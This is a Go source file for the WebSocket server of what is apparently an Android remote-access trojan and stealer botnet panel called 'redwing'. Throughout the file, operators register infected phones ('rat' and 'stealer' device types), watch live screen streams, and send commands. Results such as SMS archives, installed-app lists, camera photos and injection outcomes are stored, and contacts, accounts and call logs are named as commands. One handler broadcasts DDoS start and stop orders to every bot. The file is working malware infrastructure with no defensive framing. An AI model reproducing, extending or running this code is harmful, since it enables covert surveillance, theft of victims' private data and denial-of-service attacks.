package ws

import (
	"encoding/json"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"redwing/internal/auth"
	"redwing/internal/db"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin:     func(r *http.Request) bool { return true },
	ReadBufferSize:  65536,
	WriteBufferSize: 65536,
}

type DeviceConn struct {
	ID        string
	TeamID    string
	Conn      *websocket.Conn
	Width     int
	Height    int
	ConnectAt time.Time
	IsStealer bool
	mu        sync.Mutex
}

type PanelConn struct {
	ID       string
	TeamID   string
	Login    string
	Role     string
	Conn     *websocket.Conn
	mu       sync.Mutex
	Watching string // device_id this panel is watching
}

type Hub struct {
	mu              sync.RWMutex
	devices         map[string]*DeviceConn
	panels          map[string]*PanelConn
	OnDeviceConnect func(teamID, deviceID, model, country string)
	OnPanelAction   func(teamID, login, role, action, deviceID, details string)
}

var H = &Hub{
	devices: make(map[string]*DeviceConn),
	panels:  make(map[string]*PanelConn),
}

func (h *Hub) AddDevice(d *DeviceConn) {
	h.mu.Lock()
	h.devices[d.ID] = d
	h.mu.Unlock()

	db.DB.Exec(`UPDATE devices SET is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND team_id = ?`, d.ID, d.TeamID)
	db.DB.Exec(`INSERT INTO events (team_id, device_id, type, title) VALUES (?, ?, 'connect', 'Device connected')`, d.TeamID, d.ID)

	h.NotifyPanels(d.TeamID, map[string]any{
		"type":      "device_connected",
		"device_id": d.ID,
	})

	if h.OnDeviceConnect != nil {
		var model, country string
		db.DB.QueryRow("SELECT model, country FROM devices WHERE device_id = ?", d.ID).Scan(&model, &country)
		go h.OnDeviceConnect(d.TeamID, d.ID, model, country)
	}
}

func (h *Hub) RemoveDevice(id string) {
	h.mu.Lock()
	d, ok := h.devices[id]
	delete(h.devices, id)
	h.mu.Unlock()

	if ok {
		db.DB.Exec(`UPDATE devices SET is_online = 0, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND team_id = ?`, id, d.TeamID)
		h.NotifyPanels(d.TeamID, map[string]any{
			"type":      "device_disconnected",
			"device_id": id,
		})
	}
}

func (h *Hub) GetDevice(id string) *DeviceConn {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.devices[id]
}

func (h *Hub) GetOnlineDevices(teamID string) []*DeviceConn {
	h.mu.RLock()
	defer h.mu.RUnlock()
	var result []*DeviceConn
	for _, d := range h.devices {
		if d.TeamID == teamID {
			result = append(result, d)
		}
	}
	return result
}

func (h *Hub) AddPanel(p *PanelConn) {
	h.mu.Lock()
	h.panels[p.ID] = p
	h.mu.Unlock()
}

func (h *Hub) RemovePanel(id string) {
	h.mu.Lock()
	delete(h.panels, id)
	h.mu.Unlock()
}

func (h *Hub) NotifyPanels(teamID string, msg map[string]any) {
	data, _ := json.Marshal(msg)
	h.mu.RLock()
	defer h.mu.RUnlock()
	for _, p := range h.panels {
		if p.TeamID == teamID {
			p.mu.Lock()
			p.Conn.WriteMessage(websocket.TextMessage, data)
			p.mu.Unlock()
		}
	}
}

func (h *Hub) RelayBinaryToWatchers(deviceID, deviceTeamID string, data []byte) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	for _, p := range h.panels {
		if p.Watching == deviceID && p.TeamID == deviceTeamID {
			p.mu.Lock()
			p.Conn.WriteMessage(websocket.BinaryMessage, data)
			p.mu.Unlock()
		}
	}
}

func (h *Hub) SendToDevice(deviceID string, msg map[string]any) bool {
	d := h.GetDevice(deviceID)
	if d == nil {
		return false
	}
	outMsg := msg
	if d.IsStealer {
		outMsg = translateForStealer(msg)
	}
	data, _ := json.Marshal(outMsg)
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.Conn.WriteMessage(websocket.TextMessage, data) == nil
}

func (h *Hub) SendToDeviceIfTeam(deviceID, teamID string, msg map[string]any) bool {
	d := h.GetDevice(deviceID)
	if d == nil || d.TeamID != teamID {
		return false
	}
	outMsg := msg
	if d.IsStealer {
		outMsg = translateForStealer(msg)
	}
	data, _ := json.Marshal(outMsg)
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.Conn.WriteMessage(websocket.TextMessage, data) == nil
}

func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[WS] upgrade error: %v", err)
		return
	}
	defer conn.Close()

	resetDeadline := func() {
		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	}

	resetDeadline()
	conn.SetPongHandler(func(string) error {
		resetDeadline()
		return nil
	})
	conn.SetPingHandler(func(appData string) error {
		resetDeadline()
		return conn.WriteControl(websocket.PongMessage, []byte(appData), time.Now().Add(5*time.Second))
	})

	did := r.URL.Query().Get("did")
	tid := r.URL.Query().Get("tid")
	if did != "" && tid != "" {
		tid = resolveDeviceTeam(tid)
		ensureStealerDevice(did, tid)
		dc := &DeviceConn{
			ID: did, TeamID: tid, Conn: conn, ConnectAt: time.Now(), IsStealer: true,
		}
		H.AddDevice(dc)
		defer H.RemoveDevice(did)
		log.Printf("[+] Device %s connected (team %s)", did, tid)

		for {
			resetDeadline()
			mt, msg, err := conn.ReadMessage()
			if err != nil {
				log.Printf("[-] Stealer %s disconnected: %v", did, err)
				return
			}
			if mt == websocket.BinaryMessage {
				continue
			}
			var data map[string]any
			if json.Unmarshal(msg, &data) != nil {
				continue
			}
			handleDeviceMessage(dc, data)
		}
	}

	_, msg, err := conn.ReadMessage()
	if err != nil {
		log.Printf("[WS] first read failed: %v", err)
		return
	}

	var reg map[string]any
	if json.Unmarshal(msg, &reg) != nil {
		log.Printf("[WS] bad JSON, len=%d", len(msg))
		return
	}

	msgType, _ := reg["type"].(string)
	if msgType != "register_device" && msgType != "register_screen" {
		log.Printf("[WS] unexpected first message type: %q", msgType)
		return
	}

	deviceID, _ := reg["device_id"].(string)
	teamID, _ := reg["team_id"].(string)
	if deviceID == "" || teamID == "" {
		log.Printf("[WS] missing ids: device=%q team=%q", deviceID, teamID)
		return
	}

	teamID = resolveDeviceTeam(teamID)

	width := int(getFloat(reg, "width"))
	height := int(getFloat(reg, "height"))

	ensureDeviceExists(deviceID, teamID, width, height)

	dc := &DeviceConn{
		ID:        deviceID,
		TeamID:    teamID,
		Conn:      conn,
		Width:     width,
		Height:    height,
		ConnectAt: time.Now(),
	}
	H.AddDevice(dc)
	defer H.RemoveDevice(deviceID)

	log.Printf("[+] Device %s connected (team %s, %dx%d)", deviceID, teamID, width, height)

	for {
		resetDeadline()
		msgType, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[-] Device %s disconnected: %v", deviceID, err)
			return
		}

		if msgType == websocket.BinaryMessage {
			H.RelayBinaryToWatchers(deviceID, dc.TeamID, msg)
			continue
		}

		var data map[string]any
		if json.Unmarshal(msg, &data) != nil {
			continue
		}

		handleDeviceMessage(dc, data)
	}
}

func handleDeviceMessage(dc *DeviceConn, msg map[string]any) {
	msgType, _ := msg["type"].(string)

	switch msgType {
	case "ping":
		dc.mu.Lock()
		dc.Conn.WriteJSON(map[string]any{"type": "pong"})
		dc.mu.Unlock()
		db.DB.Exec(`UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, dc.ID)

	case "hb":
		dc.mu.Lock()
		dc.Conn.WriteJSON(map[string]any{"type": "pong"})
		dc.mu.Unlock()
		db.DB.Exec(`UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, dc.ID)

	case "register_device":

	case "screen_state":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "auto_locked_apps":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "device_metrics":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "ws_command_result":
		msg["device_id"] = dc.ID
		cmdID, _ := msg["cmd_id"].(string)
		success, _ := msg["success"].(bool)
		errStr, _ := msg["error"].(string)

		if !success && strings.Contains(errStr, "service_not_running") && cmdID != "" {
			db.DB.Exec("UPDATE commands SET status = 'pending', sent_at = NULL WHERE id = ?", cmdID)
		} else if !success && cmdID != "" {
			now := time.Now().UTC().Format("2006-01-02 15:04:05")
			resultJSON, _ := json.Marshal(map[string]string{"error": errStr})
			db.DB.Exec("UPDATE commands SET status = 'failed', result = ?, executed_at = ? WHERE id = ?",
				string(resultJSON), now, cmdID)
		}
		H.NotifyPanels(dc.TeamID, msg)

	case "command_result":
		msg["device_id"] = dc.ID
		cmd, _ := msg["command"].(string)
		if cmd == "" {
			cmd, _ = msg["action"].(string)
		}
		cmdID, _ := msg["command_id"].(string)
		if cmdID == "" {
			cmdID, _ = msg["cmd_id"].(string)
		}

		if result, ok := msg["result"]; ok {
			resultData, _ := json.Marshal(result)

			switch cmd {
			case "get_apps", "apps_list":
				appsJSON := string(resultData)
				var resultObj map[string]any
				if json.Unmarshal(resultData, &resultObj) == nil {
					if appsArr, ok := resultObj["apps"]; ok {
						if b, err := json.Marshal(appsArr); err == nil {
							appsJSON = string(b)
						}
					}
				}
				db.DB.Exec("UPDATE devices SET apps_list = ? WHERE device_id = ?", appsJSON, dc.ID)
			case "get_sms_archive", "get_sms":
				parseSMSArchiveResult(dc.ID, dc.TeamID, resultData)
			}

			now := time.Now().UTC().Format("2006-01-02 15:04:05")
			if cmdID != "" {
				db.DB.Exec("UPDATE commands SET status = 'executed', result = ?, executed_at = ? WHERE id = ?",
					string(resultData), now, cmdID)
			} else if cmd != "" {
				db.DB.Exec(`UPDATE commands SET status = 'executed', result = ?, executed_at = ? 
					WHERE id = (SELECT id FROM commands WHERE device_id = ? AND command = ? AND status IN ('pending','sent') ORDER BY created_at DESC LIMIT 1)`,
					string(resultData), now, dc.ID, cmd)
			}
		}

		if cmdID != "" {
			msg["command_id"] = cmdID
			msg["cmd_id"] = cmdID
		} else if cmd != "" {
			var matchedID string
			db.DB.QueryRow(`SELECT id FROM commands WHERE device_id = ? AND command = ? AND status = 'executed' ORDER BY executed_at DESC LIMIT 1`,
				dc.ID, cmd).Scan(&matchedID)
			if matchedID != "" {
				msg["command_id"] = matchedID
				msg["cmd_id"] = matchedID
			}
		}
		H.NotifyPanels(dc.TeamID, msg)

	case "inject_result":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "camera_photo":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "accessibility_unavailable":
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)

	case "cmd_result":
		msg["type"] = "command_result"
		msg["device_id"] = dc.ID
		if data, ok := msg["data"].(map[string]any); ok {
			for k, v := range data {
				msg[k] = v
			}
		}
		handleDeviceMessage(dc, msg)
		return

	default:
		msg["device_id"] = dc.ID
		H.NotifyPanels(dc.TeamID, msg)
	}
}

func HandlePanelWS(w http.ResponseWriter, r *http.Request) {
	var sessionLogin, sessionRole, sessionTeam string
	if cookie, err := r.Cookie("rw_session"); err == nil {
		if sess, err := validateSessionToken(cookie.Value); err == nil {
			sessionLogin = sess.Login
			sessionRole = sess.Role
			sessionTeam = sess.TeamID
		}
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	_, msg, err := conn.ReadMessage()
	if err != nil {
		return
	}

	var reg map[string]any
	if json.Unmarshal(msg, &reg) != nil {
		return
	}

	msgType, _ := reg["type"].(string)
	if msgType != "register_panel" {
		return
	}

	panelID, _ := reg["panel_id"].(string)
	if panelID == "" {
		return
	}

	if sessionTeam == "" {
		log.Printf("[WS] Panel rejected: no valid session")
		return
	}

	teamID := sessionTeam
	login := sessionLogin
	role := sessionRole

	pc := &PanelConn{
		ID:     panelID,
		TeamID: teamID,
		Login:  login,
		Role:   role,
		Conn:   conn,
	}
	H.AddPanel(pc)
	defer H.RemovePanel(panelID)

	log.Printf("[+] Panel connected: %s (team: %s)", panelID, teamID)

	devices := H.GetOnlineDevices(teamID)
	var deviceList []map[string]any
	for _, d := range devices {
		deviceList = append(deviceList, map[string]any{
			"device_id": d.ID,
			"width":     d.Width,
			"height":    d.Height,
		})
	}
	conn.WriteJSON(map[string]any{
		"type":    "device_list",
		"devices": deviceList,
	})

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[-] Panel disconnected: %s", panelID)
			return
		}

		var data map[string]any
		if json.Unmarshal(msg, &data) != nil {
			continue
		}

		handlePanelMessage(pc, data)
	}
}

func (h *Hub) logPanelAction(pc *PanelConn, action, deviceID, details string) {
	if h.OnPanelAction != nil {
		login := pc.Login
		if login == "" {
			login = "unknown"
		}
		go h.OnPanelAction(pc.TeamID, login, pc.Role, action, deviceID, details)
	}
}

func handlePanelMessage(pc *PanelConn, msg map[string]any) {
	msgType, _ := msg["type"].(string)
	deviceID, _ := msg["device_id"].(string)
	send := func(did string, m map[string]any) bool {
		return H.SendToDeviceIfTeam(did, pc.TeamID, m)
	}

	switch msgType {
	case "ping":
		pc.mu.Lock()
		pc.Conn.WriteJSON(map[string]any{"type": "pong"})
		pc.mu.Unlock()

	case "check_commands":
		send(deviceID, map[string]any{"type": "check_commands"})

	case "ws_command", "command":
		send(deviceID, msg)
		cmd, _ := msg["command"].(string)
		if cmd != "" {
			H.logPanelAction(pc, "ws_command", deviceID, cmd)
		}

	case "start_watching":
		if send(deviceID, msg) {
			pc.Watching = deviceID
		}
		H.logPanelAction(pc, "vnc_start", deviceID, "")

	case "stop_watching":
		H.logPanelAction(pc, "vnc_stop", pc.Watching, "")
		send(deviceID, msg)
		pc.Watching = ""

	case "start_stream":
		send(deviceID, msg)
		H.logPanelAction(pc, "vnc_start", deviceID, "start_stream")

	case "stop_stream":
		send(deviceID, msg)
		H.logPanelAction(pc, "vnc_stop", deviceID, "stop_stream")

	case "start_device_metrics", "start_skeleton", "request_keyframe":
		send(deviceID, msg)

	case "ddos_broadcast_start", "ddos_broadcast_stop":
		for _, d := range H.GetOnlineDevices(pc.TeamID) {
			H.SendToDevice(d.ID, msg)
		}
		H.logPanelAction(pc, "ddos", "", msgType)

	default:
		if deviceID != "" {
			send(deviceID, msg)
		}
	}
}

func resolveDeviceTeam(deviceTeamID string) string {
	var userCount int
	db.DB.QueryRow("SELECT COUNT(*) FROM users WHERE team_id = ?", deviceTeamID).Scan(&userCount)
	if userCount > 0 {
		return deviceTeamID
	}
	var teamCount int
	db.DB.QueryRow("SELECT COUNT(DISTINCT team_id) FROM users").Scan(&teamCount)
	if teamCount == 1 {
		var onlyTeam string
		db.DB.QueryRow("SELECT team_id FROM users LIMIT 1").Scan(&onlyTeam)
		if onlyTeam != "" {
			return onlyTeam
		}
	}
	return deviceTeamID
}

func ensureStealerDevice(deviceID, teamID string) {
	db.DB.Exec("INSERT OR IGNORE INTO teams (id, name) VALUES (?, ?)", teamID, "team_"+teamID)
	var exists int
	db.DB.QueryRow("SELECT COUNT(*) FROM devices WHERE device_id = ?", deviceID).Scan(&exists)
	if exists == 0 {
		db.DB.Exec(
			`INSERT INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, device_type, permissions, last_seen, created_at)
			 VALUES (?, ?, ?, '', '', '', 1, 0, 'stealer', '{}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
			deviceID, deviceID, teamID,
		)
		return
	}
	db.DB.Exec(`UPDATE devices SET team_id = ?, is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, teamID, deviceID)
}

func ensureDeviceExists(deviceID, teamID string, width, height int) {
	db.DB.Exec("INSERT OR IGNORE INTO teams (id, name) VALUES (?, ?)", teamID, "team_"+teamID)

	perms := `{"accessibility":true}`

	var exists int
	db.DB.QueryRow("SELECT COUNT(*) FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&exists)
	if exists == 0 {
		db.DB.Exec(
			`INSERT INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, device_type, permissions, last_seen, created_at)
			 VALUES (?, ?, ?, '', '', '', 1, 0, 'rat', ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
			deviceID, deviceID, teamID, perms,
		)
		return
	}

	db.DB.Exec(
		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', permissions = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`,
		teamID, perms, deviceID,
	)
}

func translateForStealer(msg map[string]any) map[string]any {
	msgType, _ := msg["type"].(string)
	switch msgType {
	case "ws_command":
		cmdID, _ := msg["command_id"].(string)
		data := map[string]any{
			"id":      cmdID,
			"command": msg["command"],
		}
		if p, ok := msg["params"]; ok {
			data["params"] = p
		}
		return map[string]any{"type": "cmd", "data": data}
	default:
		return msg
	}
}

func getFloat(m map[string]any, key string) float64 {
	v, _ := m[key].(float64)
	return v
}

func isHTTPOnlyCommand(cmd string) bool {
	switch cmd {
	case "get_apps", "apps_list", "get_sms_archive", "get_sms",
		"get_contacts", "get_accounts", "get_call_log":
		return true
	}
	return false
}

type wsSession struct {
	TeamID string
	Login  string
	Role   string
}

func validateSessionToken(token string) (*wsSession, error) {
	session, err := auth.ValidateSession(token)
	if err != nil {
		return nil, err
	}
	return &wsSession{
		TeamID: session.TeamID,
		Login:  session.Login,
		Role:   session.Role,
	}, nil
}
